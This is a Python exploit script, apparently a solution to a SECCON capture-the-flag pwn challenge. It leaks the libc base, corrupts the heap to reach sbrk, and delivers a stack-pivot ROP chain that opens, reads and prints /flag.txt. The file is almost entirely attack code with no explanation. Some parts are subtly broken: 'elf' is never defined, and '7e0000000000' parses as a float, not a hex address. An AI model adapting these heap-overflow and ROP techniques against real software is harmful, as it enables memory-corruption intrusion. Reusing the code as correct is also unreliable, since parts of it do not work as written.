from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9002"))

SLEEP, USLEEP = 1, 2

def edit(index, interval, type, message):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(interval))
    sock.sendlineafter(": ", str(type))
    if len(message) == 0x36:
        sock.sendafter(": ", message)
    else:
        sock.sendlineafter(": ", message)

def start(name1len=0, name1=b'', name2len=0, name2=b''):
    sock.sendlineafter("> ", "2")
    if name1:
        sock.sendlineafter(": ", "1")
        sock.sendlineafter(": ", str(name1len))
        sock.sendafter(": ", name1)
        sock.sendlineafter(": ", str(name2len))
        sock.sendafter(": ", name2)
    else:
        sock.sendlineafter(": ", "2")

libc = ELF("libc-2.31.so")

while True:
    sock = Socket(HOST, PORT)
    libc.base = 0
    elf.base = 0

    """
    Leak libc base
    """
    edit(0, 0, USLEEP, b"A"*0x36)
    edit(1, 1, USLEEP, "Hello")
    start()
    l = sock.recvlineafter("Alice: ")[0x34:]
    libc.base = u64(l) - libc.symbol("usleep")
    if libc.base < 7e0000000000 or libc.base >= 0x800000000000 \
       or libc.base & 0xf000 != 0x3000:
        logger.warning("Bad luck!")
        sock.close()
        continue

    """
    Expand heap
    """
    edit(1, 0x34000000, USLEEP, "Hello")
    payload  = b"\x00"*(4+0x28)
    payload += p64(0x41)
    payload += b'\xe0\x72' # sbrk
    edit(0, 0xcafe, USLEEP, payload)
    start()
    if b"Segmentation fault" in sock.recvline():
        logger.warning("Bad luck!")
        sock.close()
        continue
    elif b"Segmentation fault" in sock.recvline():
        logger.warning("Bad luck!")
        sock.close()
        continue

    """
    Heap overflow
    """
    # 0x001477f9: mov rax, [rbp+8]; call qword ptr [rax+0x28];
    # 0x00156d39: mov [rsp], rax; mov rax, [rbp+8]; call qword ptr [rax+8];
    # 0x0012796f: pop rbp; cmp [rcx], dh; rcr byte ptr [rbx+0x5d], 0x41; pop rsp; ret;
    start(8, "A"*8, 0, "B"*0x110)
    payload  = b''
    payload += p64(next(libc.gadget('mov rax, [rbp+8];'
                                    'call [rax+0x28]'))) # (1) rax = slot[1]
    payload += p32(0xdeadbeef)
    payload += b'A'
    payload += b'/flag.txt\0'
    payload += b'A' * (0x40 - len(payload))
    payload += p64(next(libc.gadget('add rsp, 0x28;'
                                    'ret;'))) # ROP[0] --> skip garbage
    payload += p64(libc.base + 0x0012796f) # (3) to ROP
    payload += b'A' * (0x40 + 0x18 - len(payload))
    payload += p64(next(libc.gadget('pop r15; ret;'))) # called from rop
    payload += b'A' * (0x40 + 0x28 - len(payload))
    payload += p64(next(libc.gadget('mov [rsp], rax;'
                                    'mov rax, [rbp+8];'
                                    'call [rax+8]'))) # (2) [rsp] = rax
    payload += flat([
        # open("/flag.txt", O_RDONLY)
        next(libc.gadget('mov rdi, rbx; call [rax+0x18]')),
        next(libc.gadget('pop rsi; ret;')),
        0,
        libc.symbol('open'),
        # read(3, buf, 0x1000)
        next(libc.gadget('pop rdx; ret;')),
        0x1000,
        next(libc.gadget('pop rsi; ret;')),
        libc.section('.bss') + 0x1000,
        next(libc.gadget('pop rdi; ret;')),
        3,
        libc.symbol('read'),
        # write(1, buf, 0x1000)
        next(libc.gadget('pop rdi; ret;')),
        1,
        libc.symbol('write'),
        # exit(0)
        next(libc.gadget('pop rdi; ret;')),
        0,
        libc.symbol('exit')
    ], map=p64)
    sock.send(payload)
    sock.shutdown("write")

    logger.info("[+] Wait until the flag comes... (Don't enter anything)")

    sock.interactive()
    break
